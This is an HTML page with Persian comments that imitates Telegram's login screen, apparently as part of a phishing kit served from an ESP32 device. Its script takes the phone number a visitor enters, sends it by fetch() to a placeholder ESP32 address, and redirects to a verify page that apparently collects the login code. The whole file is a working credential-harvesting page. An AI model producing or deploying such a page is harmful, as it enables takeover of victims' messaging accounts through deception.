<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Telegram Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    /* استایل‌های شما */
  </style>
</head>
<body>
  <div class="form-container">
    <h3>Telegram-style Login</h3>
    <form id="phoneForm">
      <input class="form-control my-3" name="phone" placeholder="Enter phone number" required>
      <button type="submit" class="btn btn-light w-100">Send Code</button>
    </form>
  </div>

  <script>
    document.getElementById('phoneForm').addEventListener('submit', function(e) {
      e.preventDefault();
      const phone = document.querySelector('input[name="phone"]').value;
      const espIP = 'ESP_IP_ADDRESS'; // جایگزین با IP واقعی ESP32
      
      // ارسال شماره به ESP32
      fetch(`http://${espIP}/submit-phone?phone=${encodeURIComponent(phone)}`)
        .then(() => {
          // انتقال به صفحه تأیید کد
          window.location.href = `verify.html?phone=${encodeURIComponent(phone)}`;
        })
        .catch(error => {
          console.error('Error:', error);
          alert('Failed to submit phone number. Please check connection.');
        });
    });
  </script>
</body>
</html>
